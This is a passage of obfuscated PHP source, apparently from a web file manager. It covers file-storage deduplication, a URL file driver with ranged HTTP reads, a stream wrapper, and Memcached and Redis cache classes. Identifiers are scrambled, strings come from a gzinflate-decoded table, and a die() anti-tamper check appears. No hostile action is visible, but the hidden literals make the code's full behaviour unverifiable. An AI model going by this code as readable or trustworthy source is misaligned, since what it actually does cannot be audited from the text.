$ø‚™È¾Ë . $ñçÒÕª¶; if ($ÃÜŠù±ı) { $Ú–”¥¼ = $Ú–”¥¼ . $í˜ë‹°[10] . $ÃÜŠù±ı; } } if (IO::isOsDriver($Ú–”¥¼) && !IO::isUploadServer($Ú–”¥¼)) { if (IO::exist($Ú–”¥¼)) { CacheLock::unlock($›©Ô¬à); return $Ú–”¥¼; } $üËĞôüË = IO::setContent($Ú–”¥¼, $í˜ë‹°[12]); if (!$üËĞôüË) { show_json($í˜ë‹°[2059], !1); } } CacheLock::unlock($›©Ô¬à); break; case $í˜ë‹°[867]: break; default: break; } return $Ú–”¥¼; } public function addFileByRemote($­²¶İÏ, $”ÉËï…­, $ü®¬ş—¶ = array()) { $îè¤²Òº =& $_SERVER[É¨™èà]; if (!IO::isFile($­²¶İÏ)) { return !1; } $†«²ÇÍĞ = $ü®¬ş—¶[$îè¤²Òº[559]] ? $ü®¬ş—¶[$îè¤²Òº[559]] : $îè¤²Òº[12]; $ÂÖ•ÃåÌ = IO::hashMd5($­²¶İÏ, $†«²ÇÍĞ); $ é”Ñäí = KodIO::parse($­²¶İÏ); $˜ñ«üèâ = array($îè¤²Òº[632] => IO::size($­²¶İÏ), $îè¤²Òº[2060] => 1, $îè¤²Òº[504] => $”ÉËï…­, $îè¤²Òº[904] => $ é”Ñäí[$îè¤²Òº[485]], $îè¤²Òº[505] => $­²¶İÏ, $îè¤²Òº[2061] => $ü®¬ş—¶[$îè¤²Òº[687]] ? $ü®¬ş—¶[$îè¤²Òº[687]] : IO::hashSimple($­²¶İÏ), $îè¤²Òº[2062] => $ÂÖ•ÃåÌ ? $ÂÖ•ÃåÌ : $†«²ÇÍĞ); if ($¼¡ø ğ¸ = $this->addFileCheckExist($˜ñ«üèâ[$îè¤²Òº[687]], $˜ñ«üèâ[$îè¤²Òº[559]], $˜ñ«üèâ[$îè¤²Òº[79]])) { return $¼¡ø ğ¸; } return $this->addFileData($˜ñ«üèâ); } private function addFileData($¸ÄÄÑˆó) { $½ÓÀ†Í =& $_SERVER[É¨™èà]; if (!$¸ÄÄÑˆó) { return !1; } if (!IO::isFile($¸ÄÄÑˆó[$½ÓÀ†Í[87]])) { return !1; } $¸ÄÄÑˆó[$½ÓÀ†Í[79]] = intval($¸ÄÄÑˆó[$½ÓÀ†Í[79]]); if (!$¸ÄÄÑˆó[$½ÓÀ†Í[79]] && strlen($¸ÄÄÑˆó[$½ÓÀ†Í[687]]) > 32) { $¸ÄÄÑˆó[$½ÓÀ†Í[79]] = intval(substr($¸ÄÄÑˆó[$½ÓÀ†Í[687]], 32)); } $¦¯ÍöÒ = $this->add($¸ÄÄÑˆó); return $this->find($¦¯ÍöÒ); } public function addFile($ÎääæüÉ, $¢‹…ÕÂ”, $§¾•™ÜŠ, $ÕòÅÌù¿ = false) { $ŒÒôé¯ó =& $_SERVER[É¨™èà]; $ê¢øØ°Î = IO::hashSimple($ÎääæüÉ); $Ãë‹ò…ƒ = IO::size($ÎääæüÉ); $£ñ‚Œ…à = $Ãë‹ò…ƒ <= 1024 * 1024 * 10 ? IO::hashMd5($ÎääæüÉ) : $ŒÒôé¯ó[12]; $Ô…ãÑÆ¿ = $ŒÒôé¯ó[2063] . $ê¢øØ°Î; CacheLock::lock($Ô…ãÑÆ¿); if ($£ñ‚Œ…à && $ê¢øØ°Î) { $¬ø¸˜óÊ = $this->addFileCheckExist($ê¢øØ°Î, $£ñ‚Œ…à, $Ãë‹ò…ƒ); if ($¬ø¸˜óÊ) { CacheLock::unlock($Ô…ãÑÆ¿); return $¬ø¸˜óÊ; } } $ú†óÎÇ¸ = $this->addFileMake($ÎääæüÉ, $¢‹…ÕÂ”, $Ãë‹ò…ƒ, $ê¢øØ°Î, $£ñ‚Œ…à, $§¾•™ÜŠ, $ÕòÅÌù¿); $‡—Âä’ = $this->addFileData($ú†óÎÇ¸); if (!$‡—Âä’) { return !1; } CacheLock::unlock($Ô…ãÑÆ¿); if (!$£ñ‚Œ…à && $‡—Âä’) { $this->fileMd5Check($‡—Âä’); } return $‡—Âä’; } public function fileMd5Check($Ğı¶íæº) { $Êµƒ¹ÇŞ =& $_SERVER[É¨™èà]; $’ùºÉ•Ÿ = array($Ğı¶íæº[$Êµƒ¹ÇŞ[553]], $Ğı¶íæº[$Êµƒ¹ÇŞ[87]]); $¤†—„é = $Êµƒ¹ÇŞ[2064] . $Ğı¶íæº[$Êµƒ¹ÇŞ[87]]; $Ì›Î°Œ = $Êµƒ¹ÇŞ[2065] . $Ğı¶íæº[$Êµƒ¹ÇŞ[553]]; TaskQueue::add($Êµƒ¹ÇŞ[2066], $’ùºÉ•Ÿ, $¤†—„é, $Ì›Î°Œ); } public function fileMd5Set($À§–ª´É, $Ûæú Ùà) { $ÎåÜËë¨ =& $_SERVER[É¨™èà]; $ßıÎ€Ñ¤ = $this->find($À§–ª´É); if (!$ßıÎ€Ñ¤ || $ßıÎ€Ñ¤[$ÎåÜËë¨[559]]) { return; } $‚ı§¥ÒÖ = IO::hashMd5($Ûæú Ùà); if (!$‚ı§¥ÒÖ) { return $ÎåÜËë¨[12]; } $this->where(array($ÎåÜËë¨[553] => $À§–ª´É))->save(array($ÎåÜËë¨[559] => $‚ı§¥ÒÖ)); } public function addFileMake($öÕ¬·®, $ù¦½Ò›, $æ–‚ŞÚİ, $¨Äíùâ, $½‰©ˆØ, $æ×ù¬ÖĞ, $º²ÀõÌØ) { $×ˆ±ãòú =& $_SERVER[É¨™èà]; $‡ÔñŒ = $this->createFileName($æ×ù¬ÖĞ, $ù¦½Ò›, $¨Äíùâ, $½‰©ˆØ); $èÊû¼ÀÅ = get_path_father($‡ÔñŒ); $‡¶—Æöï = get_path_this($‡ÔñŒ); if ($º²ÀõÌØ) { $Èµ­•àô = IO::move($öÕ¬·®, $èÊû¼ÀÅ, !1, $‡¶—Æöï); } else { $Èµ­•àô = IO::copy($öÕ¬·®, $èÊû¼ÀÅ, !1, $‡¶—Æöï); } if (!$Èµ­•àô) { return !1; } $»ŠúÕˆÀ = IO::init($Èµ­•àô); $»ŠúÕˆÀ->cacheMethod($×ˆ±ãòú[182], $»ŠúÕˆÀ->path, $×ˆ±ãòú[179]); if (IO::size($Èµ­•àô) != $æ–‚ŞÚİ) { return !1; } $¸íè„Ó = array($×ˆ±ãòú[632] => $æ–‚ŞÚİ, $×ˆ±ãòú[2060] => 1, $×ˆ±ãòú[504] => $æ×ù¬ÖĞ, $×ˆ±ãòú[904] => $ù¦½Ò›[$×ˆ±ãòú[485]], $×ˆ±ãòú[505] => $‡ÔñŒ, $×ˆ±ãòú[2061] => $¨Äíùâ, $×ˆ±ãòú[2062] => $½‰©ˆØ); return $¸íè„Ó; } public function addFileCheckExist($Î·¬šç¸, $õÈ¬Ò© , $¡öãÕé£) { $¤¬¾‰Œß =& $_SERVER[É¨™èà]; $Èá—‰ç† = $this->findByHash($Î·¬šç¸, $õÈ¬Ò© ); if (!$Èá—‰ç†) { return !1; } $Å˜Ùšµ¸ = array($¤¬¾‰Œß[2060] => intval($Èá—‰ç†[$¤¬¾‰Œß[2067]]) + 1, $¤¬¾‰Œß[632] => $¡öãÕé£); $this->where(array($¤¬¾‰Œß[554] => $Èá—‰ç†[$¤¬¾‰Œß[553]]))->save($Å˜Ùšµ¸); return $Èá—‰ç†; } public function remove($ô’ığÌŸ) { $this->linkCountChange($ô’ığÌŸ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Å™ê§ìó) { $this->linkCountChange($Å™ê§ìó, !0); } public function linkCountChange($³ƒë™ , $‰“øÆêÅ) { $Æ†„¹’ =& $_SERVER[É¨™èà]; if (!$³ƒë™ ) { return; } if (!is_array($³ƒë™ )) { $³ƒë™  = array($³ƒë™ ); } $ŞÊû´ß = array(); foreach ($³ƒë™  as $§ê†–¦) { $íË¾ğÕ‘ = $§ê†–¦ . $Æ†„¹’[12]; if (!$ŞÊû´ß[$íË¾ğÕ‘]) { $ŞÊû´ß[$íË¾ğÕ‘] = 0; } $ŞÊû´ß[$íË¾ğÕ‘]++; } $Õ–ÈÌğ = array(); foreach ($ŞÊû´ß as $§ê†–¦ => $Ü¤ÀôËÖ) { $íË¾ğÕ‘ = $Ü¤ÀôËÖ . $Æ†„¹’[12]; if (!$Õ–ÈÌğ[$íË¾ğÕ‘]) { $Õ–ÈÌğ[$íË¾ğÕ‘] = array(); } $Õ–ÈÌğ[$íË¾ğÕ‘][] = $§ê†–¦; } foreach ($Õ–ÈÌğ as $Ü¤ÀôËÖ => $ú’¢éÎ–) { if (!$ú’¢éÎ–) { continue; } $Ü¤ÀôËÖ = $‰“øÆêÅ ? $Ü¤ÀôËÖ : -intval($Ü¤ÀôËÖ); $áìÛŞ½ = array($Æ†„¹’[553] => array($Æ†„¹’[7], $ú’¢éÎ–)); if ($Ü¤ÀôËÖ < 0) { $áìÛŞ½[$Æ†„¹’[2067]] = array($Æ†„¹’[1109], abs($Ü¤ÀôËÖ)); } $this->where($áìÛŞ½)->setAdd($Æ†„¹’[2067], $Ü¤ÀôËÖ); } } public function findByHash($êÓıÕğ, $Ùş€ä = false) { $ƒ•º‘ =& $_SERVER[É¨™èà]; if (!$êÓıÕğ && !$Ùş€ä) { return !1; } $ğŞ§§· = array($ƒ•º‘[2061] => $êÓıÕğ); if ($Ùş€ä) { $ğŞ§§· = array($ƒ•º‘[2062] => $Ùş€ä); } return $this->order($ƒ•º‘[2068])->where($ğŞ§§·)->find(); } public function clearEmpty($™‹æÒìÆ = 1) { $úµÕÈ¹Ï =& $_SERVER[É¨™èà]; $Å«ÁµĞÓ = time() - 3600 * 24 * $™‹æÒìÆ; $ñ½ğ¬¶û = $úµÕÈ¹Ï[2069] . $Å«ÁµĞÓ; $êü´§± = $this->where($ñ½ğ¬¶û)->select(); if (!$êü´§±) { return; } $ßîÓÃŞ¬ = new Task($úµÕÈ¹Ï[2070], $úµÕÈ¹Ï[12], count($êü´§±)); foreach ($êü´§± as $…»ªè») { $ßîÓÃŞ¬->update(1); $this->resetFile($…»ªè»); } $ßîÓÃŞ¬->end(); } public function resetFile($†»²ù¬) { $İÚÎ¹™ =& $_SERVER[É¨™èà]; $­£ó´Æ‘ = array($İÚÎ¹™[554] => $†»²ù¬[$İÚÎ¹™[553]]); $÷§›ì¨“ = Model($İÚÎ¹™[1448])->where($­£ó´Æ‘)->count(); $®–”áéˆ = Model($İÚÎ¹™[2071])->where($­£ó´Æ‘)->count(); $‹ïış³¯ = intval($÷§›ì¨“) + intval($®–”áéˆ); if ($‹ïış³¯ == 0) { Model($İÚÎ¹™[2072])->delete($†»²ù¬[$İÚÎ¹™[553]]); $this->where($­£ó´Æ‘)->delete(); $this->metaSet($†»²ù¬[$İÚÎ¹™[553]], null, null); if (!IO::isFile($†»²ù¬[$İÚÎ¹™[87]])) { write_log(array($İÚÎ¹™[2073], ACTION, $†»²ù¬), $İÚÎ¹™[1284]); return !1; } IO::remove($†»²ù¬[$İÚÎ¹™[87]]); write_log(ACTION . $İÚÎ¹™[2074] . KodUser::id() . $İÚÎ¹™[2075] . $†»²ù¬[$İÚÎ¹™[553]] . $İÚÎ¹™[2076] . $†»²ù¬[$İÚÎ¹™[79]] . $İÚÎ¹™[202] . $†»²ù¬[$İÚÎ¹™[87]], $İÚÎ¹™[2073]); return; } if ($†»²ù¬[$İÚÎ¹™[2067]] != $‹ïış³¯) { $this->where($­£ó´Æ‘)->save(array($İÚÎ¹™[2060] => $‹ïış³¯)); } } public function storageInfo($¨±Ê²„¹ = false) { $— øçÜ =& $_SERVER[É¨™èà]; $Şî¨ŸÒ® = $this->count() + 0.0; $¹ø£ë‹ = 0; $„óŞŒøò = 1; $úŸëø†Æ = 0; $”ŠÎ°´Ì = 5000; for ($˜ˆ †Ç = 0; $˜ˆ †Ç < $Şî¨ŸÒ®; $˜ˆ †Ç = $˜ˆ †Ç + $”ŠÎ°´Ì) { $ÚÜ¯¾›« = $this->limit($˜ˆ †Ç, $˜ˆ †Ç + $”ŠÎ°´Ì)->select(); foreach ($ÚÜ¯¾›« as $ş™¥†ÖÙ) { $„óŞŒøò += $ş™¥†ÖÙ[$— øçÜ[79]] * $ş™¥†ÖÙ[$— øçÜ[2067]]; $¹ø£ë‹ += $ş™¥†ÖÙ[$— øçÜ[79]] * ($ş™¥†ÖÙ[$— øçÜ[2067]] - 1); $úŸëø†Æ += $ş™¥†ÖÙ[$— øçÜ[2067]]; } } $·˜‡äï = array($— øçÜ[2077] => $„óŞŒøò, $— øçÜ[2078] => $¹ø£ë‹, $— øçÜ[2079] => $¹ø£ë‹ / $„óŞŒøò, $— øçÜ[83] => $Şî¨ŸÒ®, $— øçÜ[2080] => $úŸëø†Æ); return $·˜‡äï; } } goto fã©–÷”¿£; cï‹ÏëÃô: $ngzwvfydjb = $_SERVER[É¨™èà][694]; if (strlen($ngzwvfydjb) < $_SERVER[É¨™èà][313]) { die; } $_SERVER[–úÃ®‰¸] = explode($_SERVER[É¨™èà][695], gzinflate(substr($_SERVER[É¨™èà][696], 10, -8))); goto E®¾ßñõ‘; dœ¶¨ÑÚ†í: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($·äµ£Şœ = false) { } public function exist($²Ø¬»Œ) { $”Ï˜ŸÛ = $this->info($²Ø¬»Œ); return $”Ï˜ŸÛ[$_SERVER[É¨™èà][235]]; } public function isFile($Ñ¯¾ÚÜ) { $Õ€Ê™ı¸ = $this->info($Ñ¯¾ÚÜ); return $Õ€Ê™ı¸[$_SERVER[É¨™èà][235]]; } public function isFolder($ÆÂíÍä´) { return !1; } public function size($·õÀ¼ù½) { $ÃÍ›ıßƒ = $this->info($·õÀ¼ù½); return $ÃÍ›ıßƒ[$_SERVER[É¨™èà][79]]; } public function info($²¶Ê±è) { return $this->infoParse($²¶Ê±è); } public function infoAuth($˜éÒ”) { return $this->infoParse($˜éÒ”); } public function infoWithChildren($ÈşÛÖÔ‚) { return $this->infoParse($ÈşÛÖÔ‚); } public function infoFull($á¾¢î•¿) { return $this->infoParse($á¾¢î•¿); } private function infoParse($íÃÚûæ) { $»úÀ¬Ã =& $_SERVER[É¨™èà]; $ÄáŠÊ¹¡ = $this->header($íÃÚûæ); if (!$ÄáŠÊ¹¡ || !$ÄáŠÊ¹¡[$»úÀ¬Ã[840]]) { return !1; } $ÑØØıÌ = _get($ÄáŠÊ¹¡, $»úÀ¬Ã[423], 0); $ûÈ¼…Ğ‚ = array($»úÀ¬Ã[32] => $ÄáŠÊ¹¡[$»úÀ¬Ã[32]], $»úÀ¬Ã[87] => $íÃÚûæ, $»úÀ¬Ã[33] => $»úÀ¬Ã[233], $»úÀ¬Ã[79] => intval($ÑØØıÌ), $»úÀ¬Ã[169] => get_path_ext($ÄáŠÊ¹¡[$»úÀ¬Ã[32]]), $»úÀ¬Ã[1484] => $ÑØØıÌ > 0 && $ÄáŠÊ¹¡[$»úÀ¬Ã[1633]], $»úÀ¬Ã[1485] => !1); return $ûÈ¼…Ğ‚; } private function header($ŠÜÎœìó) { $É“ÈÃôÈ =& $_SERVER[É¨™èà]; if (isset(self::$_cacheHeader[$ŠÜÎœìó])) { return self::$_cacheHeader[$ŠÜÎœìó]; } $ò…÷û‰¬ = isset($GLOBALS[$É“ÈÃôÈ[1634]]) ? $GLOBALS[$É“ÈÃôÈ[1634]] : !1; $GLOBALS[$É“ÈÃôÈ[1634]] = !0; self::$_cacheHeader[$ŠÜÎœìó] = url_header($ŠÜÎœìó); $GLOBALS[$É“ÈÃôÈ[1634]] = $ò…÷û‰¬; return self::$_cacheHeader[$ŠÜÎœìó]; } public function hashSimple($Ôä‡çèš, $—÷œ‘½Ü = false) { $Ê˜Óèèš =& $_SERVER[É¨™èà]; $öÓœÛùş = $this->info($Ôä‡çèš); if (!$öÓœÛùş || !$öÓœÛùş[$Ê˜Óèèš[235]]) { return !1; } $¥ïæªö« = $öÓœÛùş[$Ê˜Óèèš[79]]; $¯ÈÓô•ø = 200; $ò©í†Öó = 50; if ($¥ïæªö« <= $¯ÈÓô•ø * $ò©í†Öó) { return md5($this->fileSubstr($Ôä‡çèš, 0, $¥ïæªö«)) . $¥ïæªö«; } $’Äñ›”Ì = intval($¥ïæªö« / $ò©í†Öó); $¾»úÈï = $Ê˜Óèèš[12]; $öë¸ÖÚš = timeFloat(); $½Æäó¯ = 15; for ($óñ˜İï = 0; $óñ˜İï < $ò©í†Öó; $óñ˜İï++) { if (timeFloat() - $öë¸ÖÚš > $½Æäó¯) { return !1; } $Å¹ÑÅÄ“ = $this->fileSubstr($Ôä‡çèš, $’Äñ›”Ì * $óñ˜İï, $¯ÈÓô•ø); if (!$Å¹ÑÅÄ“) { return !1; } $¾»úÈï .= $Å¹ÑÅÄ“; } $¾»úÈï .= $this->fileSubstr($Ôä‡çèš, $¥ïæªö« - $¯ÈÓô•ø, $¯ÈÓô•ø); return md5($¾»úÈï) . $¥ïæªö«; } public function getContent($œõ•™¢ü) { return $this->fileSubstr($œõ•™¢ü); } public function fileSubstr($Ğè³Ôƒß, $«½Ï’ŒÜ = 0, $ŞÎÜˆ²· = -1) { $¹ó—Šë =& $_SERVER[É¨™èà]; $×ë”‰Ëë = $this->info($Ğè³Ôƒß); if (!$×ë”‰Ëë || !$×ë”‰Ëë[$¹ó—Šë[235]] && $×ë”‰Ëë[$¹ó—Šë[79]] > 1024 * 1024 * 10) { return !1; } if ($ŞÎÜˆ²· === -1) { $ŞÎÜˆ²· = $×ë”‰Ëë[$¹ó—Šë[79]]; } if ($ŞÎÜˆ²· == 0) { return $¹ó—Šë[12]; } $…†ö–í– = array($¹ó—Šë[1635] . $«½Ï’ŒÜ . $¹ó—Šë[878] . ($«½Ï’ŒÜ + $ŞÎÜˆ²· - 1)); $éìòÖ‰ = url_request($Ğè³Ôƒß, $¹ó—Šë[1524], !1, $…†ö–í–, !1, !1, 30); return $éìòÖ‰[$¹ó—Šë[1307]] ? $éìòÖ‰[$¹ó—Šë[1307]] : $¹ó—Šë[12]; } public function download($ëÓ‘¦Õñ, $öñèÊù) { Downloader::start($ëÓ‘¦Õñ, $öñèÊù); return $öñèÊù; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($’¹Ï¥×‘, $Ä°“ÇŸŞ = '') { $this->info = $this->info($’¹Ï¥×‘); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[É¨™èà][87]]; $this->pathOpen = $’¹Ï¥×‘; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$’¹Ï¥×‘])) { self::$_chunkBuffer[$’¹Ï¥×‘] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($—ß®Øğ÷) { $ØÚ˜æÕ¸ = $this->fileSubstr($this->pose, $—ß®Øğ÷); $this->pose += strlen($ØÚ˜æÕ¸); return $ØÚ˜æÕ¸; } public function stream_tell() { return $this->pose; } public function stream_seek($²Š•‡·›, $ºÒ¦ù²´) { $û£ßã½§ =& $_SERVER[É¨™èà]; if ($ºÒ¦ù²´ == SEEK_SET) { $this->pose = $²Š•‡·›; } else { if ($ºÒ¦ù²´ == SEEK_CUR) { $this->pose += $²Š•‡·›; } else { if ($ºÒ¦ù²´ == SEEK_END) { $this->pose = $this->info[$û£ßã½§[79]] + intval($²Š•‡·›); } } } if ($²Š•‡·› < 0) { $this->pose = $this->info[$û£ßã½§[79]] + $²Š•‡·›; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[É¨™èà][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Á«È—É, $¡êøü®è) { $–àôˆ›× =& $_SERVER[É¨™èà]; $í«¶÷â = $this->info($Á«È—É); return array($–àôˆ›×[1427] => 0, $–àôˆ›×[1636] => 0, $–àôˆ›×[16] => 32768 + 511, $–àôˆ›×[1637] => 0, $–àôˆ›×[1638] => 0, $–àôˆ›×[1639] => 0, $–àôˆ›×[1640] => 0, $–àôˆ›×[79] => $í«¶÷â[$–àôˆ›×[79]], $–àôˆ›×[1641] => $í«¶÷â[$–àôˆ›×[1483]], $–àôˆ›×[1598] => $í«¶÷â[$–àôˆ›×[88]], $–àôˆ›×[1597] => $í«¶÷â[$–àôˆ›×[234]], $–àôˆ›×[1642] => 0, $–àôˆ›×[1643] => 0); } static $fileInfo = array(); public function info($İÚøõ½Ì) { $½¹óùÂ = $_SERVER[É¨™èà][1644]; if (isset(self::$fileInfo[$İÚøõ½Ì])) { return self::$fileInfo[$İÚøõ½Ì]; } if (substr($İÚøõ½Ì, 0, strlen($½¹óùÂ)) != $½¹óùÂ) { return !1; } self::$fileInfo[$İÚøõ½Ì] = IO::info(substr($İÚøõ½Ì, strlen($½¹óùÂ))); return self::$fileInfo[$İÚøõ½Ì]; } public static function read($›ƒşÀ˜®, $ŸƒíáÀË, $¤ú¼É‡Ã) { if (!isset(self::$_fopenCache[$›ƒşÀ˜®])) { $ûÏ»¸¿± = new StreamWrapperIO(); $ûÏ»¸¿±->stream_open($›ƒşÀ˜®); self::$_fopenCache[$›ƒşÀ˜®] = $ûÏ»¸¿±; } $ûÏ»¸¿± = self::$_fopenCache[$›ƒşÀ˜®]; return $ûÏ»¸¿±->fileSubstr($ŸƒíáÀË, $¤ú¼É‡Ã); } public static function _read($ÀşØØó¤, $İî¿‡ œ, $ØËáºúõ) { $»½¯ê•Ÿ =& $_SERVER[É¨™èà]; $»áÉğ˜Á = fopen($ÀşØØó¤, $»½¯ê•Ÿ[1487]); if (!$»áÉğ˜Á) { return $»½¯ê•Ÿ[12]; } $êßùà¥ = 8192; fseek($»áÉğ˜Á, $İî¿‡ œ, SEEK_SET); $’Ÿé¤ü = $»½¯ê•Ÿ[12]; $³œÃ³²µ = 0; while ($³œÃ³²µ < $ØËáºúõ) { $çŸÓÔ—¯ = min($êßùà¥, $ØËáºúõ - $³œÃ³²µ); $’Ÿé¤ü .= fread($»áÉğ˜Á, $çŸÓÔ—¯); $³œÃ³²µ += $çŸÓÔ—¯; } fclose($»áÉğ˜Á); return $’Ÿé¤ü; } public function fileSubstr($»¸˜¼À¶, $¯üñ»íô) { $…Öµè¡ =& $_SERVER[É¨™èà]; $ÑæÆĞÇ‚ = $this->info[$…Öµè¡[79]]; $ƒ€Šîã = $»¸˜¼À¶; $ÍàĞ÷µÔ = $¯üñ»íô; if ($»¸˜¼À¶ < 0) { $»¸˜¼À¶ = $ÑæÆĞÇ‚ + $»¸˜¼À¶; } if ($¯üñ»íô === !1) { $¯üñ»íô = $ÑæÆĞÇ‚ - $»¸˜¼À¶; } if ($»¸˜¼À¶ + $¯üñ»íô > $ÑæÆĞÇ‚) { $¯üñ»íô = $ÑæÆĞÇ‚ - $»¸˜¼À¶; } if ($¯üñ»íô <= 0) { return $…Öµè¡[12]; } if ($»¸˜¼À¶ < 0 || $»¸˜¼À¶ >= $ÑæÆĞÇ‚ || $¯üñ»íô <= 0 || $¯üñ»íô > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\x69\154\145\x52\x65\x61\x64\x20\145\162\162\157\x72\41\40\163\x74\x61\x72\164\75{$»¸˜¼À¶}\73\x6c\145\x6e\x67\164\x68\75{$¯üñ»íô}\x3b\40\163\x69\172\x65\x3d{$ÑæÆĞÇ‚}\x3b"); } $×€ÁÌÈ = 64 * 1024; $ óÌáş  =& self::$_chunkBuffer[$this->path]; if (!$ óÌáş ) { $ óÌáş  = array(); } $ñ¢àù„ = 0; $­¹ŒîÄÚ = 0; $‚­“ÕŸÑ = $…Öµè¡[12]; foreach ($ óÌáş  as $ñ¢àù„ => $‚­“ÕŸÑ) { $ñ¢àù„ = intval($ñ¢àù„); $­¹ŒîÄÚ = $ñ¢àù„ + strlen($‚­“ÕŸÑ); if ($»¸˜¼À¶ >= $­¹ŒîÄÚ) { continue; } if ($»¸˜¼À¶ >= $ñ¢àù„ && $»¸˜¼À¶ + $¯üñ»íô <= $­¹ŒîÄÚ) { return substr($‚­“ÕŸÑ, $»¸˜¼À¶ - $ñ¢àù„, $¯üñ»íô); } break; } if (count($ óÌáş ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($…Öµè¡[1645], $…Öµè¡[1646] . count($ óÌáş ) . "\x3b\163\164\141\162\x74\x3d{$»¸˜¼À¶}\x2c\x6c\x65\156\147\x74\x68\x3d{$¯üñ»íô}\x3b\x70\x6f\x73\145\72{$ñ¢àù„}\x7e{$­¹ŒîÄÚ}"); throw new Exception($…Öµè¡[1647]); } $§ó³şµ = intval($»¸˜¼À¶ / $×€ÁÌÈ) * $×€ÁÌÈ; $·Ö‘Ïë‰ = ceil(($»¸˜¼À¶ + $¯üñ»íô) / $×€ÁÌÈ) * $×€ÁÌÈ - $§ó³şµ; $Ò˜±ÒáÛ = IO::fileSubstr($this->path, $§ó³şµ, $·Ö‘Ïë‰); $ óÌáş [$§ó³şµ . $…Öµè¡[12]] = $Ò˜±ÒáÛ; ksort($ óÌáş ); $¯“¾Õİ = substr($Ò˜±ÒáÛ, $»¸˜¼À¶ - $§ó³şµ, $¯üñ»íô); return $¯“¾Õİ; } private function log($¾ºÅ¬¾, $•§Ã¹™) { $»¬Û‰çİ =& $_SERVER[É¨™èà]; $ÜŒ™ã†À = timeFloat() - $this->timeStart; write_log(sprintf($»¬Û‰çİ[1648], $¾ºÅ¬¾, $this->info[$»¬Û‰çİ[32]], $ÜŒ™ã†À, $•§Ã¹™), $»¬Û‰çİ[1284]); } } class Message { function __construct() { } public function send($“‹æ¹÷ = '', $ÌúùğšĞ = array(), $¤¿¨ƒî‡ = "\x74\x65\x78\164") { $µŞÇäÃ¶ =& $_SERVER[É¨™èà]; $ÈÄ“„Ü = array($µŞÇäÃ¶[33] => $µŞÇäÃ¶[1230], $µŞÇäÃ¶[171] => $“‹æ¹÷); if (in_array($¤¿¨ƒî‡, array($µŞÇäÃ¶[1230], $µŞÇäÃ¶[1649]))) { $ÈÄ“„Ü[$µŞÇäÃ¶[33]] = $¤¿¨ƒî‡; } $ÌúùğšĞ = array($µŞÇäÃ¶[590] => isset($ÌúùğšĞ[$µŞÇäÃ¶[590]]) ? $ÌúùğšĞ[$µŞÇäÃ¶[590]] : $µŞÇäÃ¶[12], $µŞÇäÃ¶[677] => isset($ÌúùğšĞ[$µŞÇäÃ¶[677]]) ? $ÌúùğšĞ[$µŞÇäÃ¶[677]] : $µŞÇäÃ¶[12]); if (empty($“‹æ¹÷) || empty($ÌúùğšĞ[$µŞÇäÃ¶[590]]) && empty($ÌúùğšĞ[$µŞÇäÃ¶[677]])) { return !1; } $Ë—Òì‡Ç = array($µŞÇäÃ¶[1578] => $ÈÄ“„Ü, $µŞÇäÃ¶[1650] => $ÌúùğšĞ); Hook::trigger($µŞÇäÃ¶[1651], $Ë—Òì‡Ç); } } goto Dğœò·ó‡ê; D­„‚Òœ‘º: class CacheMemcached { public $handle; public $cacheTime; public function __construct($æÇê¨§Ë, $¬ø„¨©Ä) { $şŒĞËëğ =& $_SERVER[É¨™èà]; if (!class_exists($şŒĞËëğ[964])) { show_json($şŒĞËëğ[965], !1); } $this->cacheTime = $¬ø„¨©Ä; $this->handle = new Memcached(); if (is_array($æÇê¨§Ë[$şŒĞËëğ[966]]) && count($æÇê¨§Ë[$şŒĞËëğ[966]]) >= 1) { foreach ($æÇê¨§Ë[$şŒĞËëğ[966]] as $ªúÅ¹™Ô) { $»‘ùÓò = explode($şŒĞËëğ[4], $ªúÅ¹™Ô); $this->handle->addServer($»‘ùÓò[0], $»‘ùÓò[1]); } } else { $this->handle->addServer($æÇê¨§Ë[$şŒĞËëğ[209]], $æÇê¨§Ë[$şŒĞËëğ[210]]); } } public function set($¶ÔöÉÊ, $Ê»„ˆêĞ, $ÂÒ©ˆ±­ = false) { $ÂÒ©ˆ±­ = $ÂÒ©ˆ±­ ? $ÂÒ©ˆ±­ : $this->cacheTime; return $this->handle->set($¶ÔöÉÊ, $Ê»„ˆêĞ, $ÂÒ©ˆ±­); } public function get($ºçòú’¸) { return $this->handle->get($ºçòú’¸); } public function remove($ëèË¢Õ‡) { return $this->handle->delete($ëèË¢Õ‡); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($”Î‰ğµ, $¼»£€ÚÙ) { $Š¼Õßì =& $_SERVER[É¨™èà]; if (!class_exists($Š¼Õßì[967])) { show_json($Š¼Õßì[968], !1); } $this->cacheTime = $¼»£€ÚÙ; $ ³›¤œ¢ = isset($”Î‰ğµ[$Š¼Õßì[969]]) ? $”Î‰ğµ[$Š¼Õßì[969]] : 10; $¢Á¼¿ò = _get($”Î‰ğµ, $Š¼Õßì[966]); if ($¢Á¼¿ò && is_array($¢Á¼¿ò)) { $this->initCluster($”Î‰ğµ, $ ³›¤œ¢); } else { $this->handle = $this->init($”Î‰ğµ, $ ³›¤œ¢); } } private function init($‰¥Œ¸’ú, $”±Ğòş) { $¡¤øöÊÂ =& $_SERVER[É¨™èà]; $ªÅó˜İù = new Redis(); $¤â²µáÆ = isset($‰¥Œ¸’ú[$¡¤øöÊÂ[970]]) ? $‰¥Œ¸’ú[$¡¤øöÊÂ[970]] : !1; if ($¤â²µáÆ) { $ªÅó˜İù->pconnect($‰¥Œ¸’ú[$¡¤øöÊÂ[209]], $‰¥Œ¸’ú[$¡¤øöÊÂ[210]], $”±Ğòş); } else { $ªÅó˜İù->connect($‰¥Œ¸’ú[$¡¤øöÊÂ[209]], $‰¥Œ¸’ú[$¡¤øöÊÂ[210]], $”±Ğòş); } if 